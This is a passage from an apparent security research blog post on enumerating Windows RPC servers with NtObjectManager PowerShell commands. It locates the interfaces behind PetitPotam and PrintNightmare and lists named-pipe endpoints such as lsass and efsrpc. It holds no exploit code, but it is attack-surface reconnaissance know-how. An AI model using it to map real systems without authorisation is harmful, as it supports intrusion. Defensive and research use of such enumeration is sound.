</span><span class="n">AggregatorHost.exe</span><span class="w">                                           </span><span class="nx">7df1ceae-de4e-4e6f-ab14-49636e7c2052</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">2</span><span class="w">     </span><span class="nx">1</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">APHostService.dll</span><span class="w">                                            </span><span class="nx">d2716e94-25cb-4820-bc15-537866578562</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">8</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">OneSyncSvc</span><span class="w">                </span><span class="nx">False</span><span class="w">
</span><span class="n">appidsvc.dll</span><span class="w">                                                 </span><span class="nx">8a7b5006-cc13-11db-9705-005056c00008</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">4</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">AppIDSvc</span><span class="w">                  </span><span class="nx">False</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">0497b57d-2e66-424f-a0c6-157cd5d41700</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">9</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">58e604e8-9adb-4d2e-a464-3b0683fb1480</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">fd7a0523-dc70-43dd-9b2e-9c5ed48225b1</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">5f54ce7d-5b79-4175-8584-cb65313a0e98</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">201ef99a-7fa0-444c-9399-19ba84f12a1a</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">7</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">0f738e20-73c0-4ca8-aa6a-8dfef545fea8</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">appmgmts.dll</span><span class="w">                                                 </span><span class="nx">8c7daf44-b6dc-11d1-9a4c-0020af6e7c57</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">9</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">AppMgmt</span><span class="w">                   </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">8c7fbdb0-8513-44f9-a8b1-1a3b49322bf4</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">4b183cf6-affd-4872-9da2-7564b683d027</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">6</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">71d6addc-3548-4d49-8580-589694df3c9d</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">2</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">8d17061c-534a-4f1b-bd77-f615421cf379</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">4</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">6d809348-7e6c-41b9-91bc-630fe5503d66</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">44e10347-37a0-494c-871c-fb90f7145742</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">10</span><span class="w">    </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">edce686d-acae-4a2a-8945-24489443c35e</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">af1e812f-2d47-4c99-9b36-15984de66d89</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">2</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">461e6f82-89d8-4b7b-95ca-2e5c965953fc</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">22</span><span class="w">    </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">66055171-882c-4625-8fd7-cc7c30e2b226</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVEntSubsystems64.dll</span><span class="w">                                      </span><span class="nx">8a92a787-eba6-4d09-ba84-0a8cb293bc30</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVShNotify.exe</span><span class="w">                                             </span><span class="nx">a80a054e-95a5-46b2-9b3b-afdb29f247fb</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVShNotify.exe</span><span class="w">                                             </span><span class="nx">7f89f606-468e-4ee4-b1f3-73b68767b0e1</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppVShNotify.exe</span><span class="w">                                             </span><span class="nx">6bbd4016-73b6-4fac-81c4-f2256dcee12d</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">AppXDeploymentServer.dll</span><span class="w">                                     </span><span class="nx">ae2dc901-312d-41df-8b79-e835e63db874</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">79</span><span class="w">    </span><span class="nx">1</span><span class="w">   </span><span class="nx">AppXSvc</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">AppXDeploymentServer.dll</span><span class="w">                                     </span><span class="nx">ff9fd3c4-742e-45e0-91dd-2f5bc632a1df</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">3</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">AppXSvc</span><span class="w">                   </span><span class="nx">True</span><span class="w">
</span><span class="n">audiodg.exe</span><span class="w">                                                  </span><span class="nx">bc6d982b-e799-48b2-a732-4ac111923bc6</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">8</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">99b833a0-e768-4a17-b117-0e32fa4b6bb9</span><span class="w"> </span><span class="nx">2.8</span><span class="w"> </span><span class="nx">169</span><span class="w">   </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">c7ce3826-891f-4376-b161-c63d2403142c</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">cba4c918-e55a-46ee-aa62-cade158e9165</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">910562c3-ebd9-46b9-baba-1d45842a0ceb</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">12</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">2b29a846-9ad7-49b6-bc52-b019c5c0c56f</span><span class="w"> </span><span class="nx">1.6</span><span class="w"> </span><span class="nx">55</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">authz.dll</span><span class="w">                                                    </span><span class="nx">0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7</span><span class="w"> </span><span class="nx">0.0</span><span class="w"> </span><span class="nx">7</span><span class="w">     </span><span class="nx">0</span><span class="w">                             </span><span class="nx">False</span><span class="w">
</span><span class="n">bdesvc.dll</span><span class="w">                                                   </span><span class="nx">ae55c4c0-64ce-11dd-ad8b-0800200c9a66</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">13</span><span class="w">    </span><span class="nx">1</span><span class="w">   </span><span class="nx">BDESVC</span><span class="w">                    </span><span class="nx">True</span><span class="w">
</span><span class="n">BFE.DLL</span><span class="w">                                                      </span><span class="nx">dd490425-5325-4565-b774-7e27d6c09c24</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">194</span><span class="w">   </span><span class="nx">1</span><span class="w">   </span><span class="nx">BFE</span><span class="w">                       </span><span class="nx">True</span><span class="w">

</span><span class="c"># several lines ommited</span><span class="w">
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">$allrpc</code> now contains a collection of <code class="language-plaintext highlighter-rouge">NtApiDotNet.Win32.RpcServer</code> objects that may or may not also include clients.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>PS C:\Users\user&gt; $rpc[0] | Get-Member


   TypeName: NtApiDotNet.Win32.RpcServer

Name                   MemberType Definition
----                   ---------- ----------
Equals                 Method     bool Equals(System.Object obj)
FormatAsText           Method     string FormatAsText(), string FormatAsText(bool remove_comments), string FormatAsText(bool remove_comments, bool cpp_format)
GetHashCode            Method     int GetHashCode()
GetType                Method     type GetType()
ResolveRunningEndpoint Method     string ResolveRunningEndpoint()
Serialize              Method     void Serialize(System.IO.Stream stm), byte[] Serialize()
ToString               Method     string ToString()
Client                 Property   bool Client {get;}
ComplexTypes           Property   System.Collections.Generic.IEnumerable[NtApiDotNet.Ndr.NdrComplexTypeReference] ComplexTypes {get;}
</pre></table></code></div></div><h4 id="interfaces"><span class="mr-2">Interfaces</span><a href="#interfaces" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>If you know the specific interface that you are looking for, it is quite easy to find using <em>NtObjectManager</em>. For <em>PetitPotam</em> the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ab3c0be4-5b55-4a08-b198-f17170100be6">EFSRPC</a> interface was <code class="language-plaintext highlighter-rouge">c681d488-d850-11d0-8c52-00c04fd90f7e</code>. To discover that the following command would work.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-InterfaceId</span><span class="w"> </span><span class="s1">'c681d488-d850-11d0-8c52-00c04fd90f7e'</span><span class="w">

</span><span class="n">Name</span><span class="w">          </span><span class="nx">UUID</span><span class="w">                                 </span><span class="nx">Ver</span><span class="w"> </span><span class="nx">Procs</span><span class="w"> </span><span class="nx">EPs</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Running</span><span class="w">
</span><span class="o">----</span><span class="w">          </span><span class="o">----</span><span class="w">                                 </span><span class="o">---</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="o">-------</span><span class="w"> </span><span class="o">-------</span><span class="w">
</span><span class="n">efslsaext.dll</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">21</span><span class="w">    </span><span class="nx">0</span><span class="w">           </span><span class="nx">False</span><span class="w">
</span></pre></table></code></div></div><p>For detailed information:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-InterfaceId</span><span class="w"> </span><span class="s1">'c681d488-d850-11d0-8c52-00c04fd90f7e'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">


</span><span class="n">InterfaceId</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w">
</span><span class="n">InterfaceVersion</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="n">TransferSyntaxId</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">8a885d04-1ceb-11c9-9fe8-08002b104860</span><span class="w">
</span><span class="n">TransferSyntaxVersion</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2.0</span><span class="w">
</span><span class="n">ProcedureCount</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">21</span><span class="w">
</span><span class="n">Procedures</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">EfsRpcOpenFileRaw_Downlevel</span><span class="p">,</span><span class="w"> </span><span class="nx">EfsRpcReadFileRaw_Downlevel</span><span class="p">,</span><span class="w"> </span><span class="nx">EfsRpcWriteFileRaw_Downlevel</span><span class="p">,</span><span class="w"> </span><span class="nx">EfsRpcCloseRaw_Downlevel...</span><span class="p">}</span><span class="w">
</span><span class="n">Server</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">UUID:</span><span class="w"> </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w">
</span><span class="n">ComplexTypes</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">Struct_0</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_1</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_2</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_3...</span><span class="p">}</span><span class="w">
</span><span class="n">FilePath</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Windows\system32\efslsaext.dll</span><span class="w">
</span><span class="n">Name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">efslsaext.dll</span><span class="w">
</span><span class="n">Offset</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">71808</span><span class="w">
</span><span class="n">ServiceName</span><span class="w">           </span><span class="p">:</span><span class="w">
</span><span class="n">ServiceDisplayName</span><span class="w">    </span><span class="p">:</span><span class="w">
</span><span class="n">IsServiceRunning</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">Endpoints</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">EndpointCount</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">Client</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span></pre></table></code></div></div><p>To discover other interesting interfaces, like the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/8405f9fc-556b-4bb4-b9bb-08b1e96802f3">MS-PAR</a> protocol “<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">nightmare</a>” interface (<code class="language-plaintext highlighter-rouge">76F03F96-CDFD-44FC-A22C-64950A001209</code>), try this command (using a slight variation <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2"><code class="language-plaintext highlighter-rouge">Where-Object</code></a> showing that the <code class="language-plaintext highlighter-rouge">RpcServer</code> objects play nice with standard PS commands):</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">InterfaceId</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'76F03F96-CDFD-44FC-A22C-64950A001209'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">


</span><span class="n">InterfaceId</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">76f03f96-cdfd-44fc-a22c-64950a001209</span><span class="w">
</span><span class="n">InterfaceVersion</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="n">TransferSyntaxId</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">8a885d04-1ceb-11c9-9fe8-08002b104860</span><span class="w">
</span><span class="n">TransferSyntaxVersion</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">2.0</span><span class="w">
</span><span class="n">ProcedureCount</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">81</span><span class="w">
</span><span class="n">Procedures</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">RpcAsyncOpenPrinter</span><span class="p">,</span><span class="w"> </span><span class="nx">RpcAsyncAddPrinter</span><span class="p">,</span><span class="w"> </span><span class="nx">RpcAsyncSetJob</span><span class="p">,</span><span class="w"> </span><span class="nx">RpcAsyncGetJob...</span><span class="p">}</span><span class="w">
</span><span class="n">Server</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">UUID:</span><span class="w"> </span><span class="nx">76f03f96-cdfd-44fc-a22c-64950a001209</span><span class="w">
</span><span class="n">ComplexTypes</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">Struct_0</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_1</span><span class="p">,</span><span class="w"> </span><span class="nx">Union_2</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_3...</span><span class="p">}</span><span class="w">
</span><span class="n">FilePath</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Windows\system32\spoolsv.exe</span><span class="w">
</span><span class="n">Name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">spoolsv.exe</span><span class="w">
</span><span class="n">Offset</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">538032</span><span class="w">
</span><span class="n">ServiceName</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Spooler</span><span class="w">
</span><span class="n">ServiceDisplayName</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">Print</span><span class="w"> </span><span class="nx">Spooler</span><span class="w">
</span><span class="n">IsServiceRunning</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">Endpoints</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="p">{[</span><span class="mi">76</span><span class="n">f03f96</span><span class="nt">-cdfd-44fc-a22c-64950a001209</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_ip_tcp:</span><span class="p">[</span><span class="mi">49669</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="mi">76</span><span class="n">f03f96</span><span class="nt">-cdfd-44fc-a22c-64950a001209</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="nx">ncalrpc:</span><span class="p">[</span><span class="n">LRPC</span><span class="nt">-6406b1545800cf205a</span><span class="p">]}</span><span class="w">
</span><span class="n">EndpointCount</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">Client</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span></pre></table></code></div></div><h4 id="endpoints"><span class="mr-2">Endpoints</span><a href="#endpoints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>For <em>endpoints</em> searching, you might know a <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/finding-endpoints#using-well-known-endpoints">well-known</a> endpoint or perhaps a specific <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/protocol-sequence-constants">protocol sequence</a> for your RPC server, and you can query to see which RPC server has that endpoint.</p><p>Query your parsed servers that contain endpoints for named pipe endpoints:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Endpoints</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Endpoints</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w">

</span><span class="p">[</span><span class="n">df1941c5</span><span class="nt">-fe89-4e79-bf10-463657acf44d</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np:</span><span class="p">[</span><span class="n">\\pipe\\efsrpc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">04</span><span class="n">eeb297</span><span class="nt">-cbf4-466b-8a2a-bfd6a2f10bba</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\efsrpc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">51</span><span class="n">a227ae</span><span class="nt">-825b-41f2-b4a9-1ac9557a1018</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">8</span><span class="n">fb74744</span><span class="nt">-b2ff-4c00-be0d-9ef9a191fe1b</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="n">b25a52bf</span><span class="nt">-e5dd-4f4a-aea6-8ca7272a0e86</span><span class="p">,</span><span class="w"> </span><span class="mf">2.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">650</span><span class="n">a7e26</span><span class="nt">-eab8-5533-ce43-9c1dfce11511</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\ROUTER</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">12345778</span><span class="nt">-1234-abcd-ef00-0123456789ac</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">3</span><span class="n">a9ef155</span><span class="nt">-691d-4449-8d05-09ad57031823</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">86</span><span class="n">d35949</span><span class="nt">-83c9-4044-b424-db363231fd0c</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">29770</span><span class="n">a8f</span><span class="nt">-829b-4158-90a2-78cd488501f7</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\SessEnvPublicRpc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">1</span><span class="n">ff70682</span><span class="nt">-0a51-30e8-076d-740be8cee98b</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">378</span><span class="n">e52b0</span><span class="nt">-c0a9-11cf-822d-00aa0051e40f</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="n">f6beaff7</span><span class="nt">-1e19-4fbb-9f8f-b89e2018337c</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\eventlog</span><span class="p">]</span><span class="w">
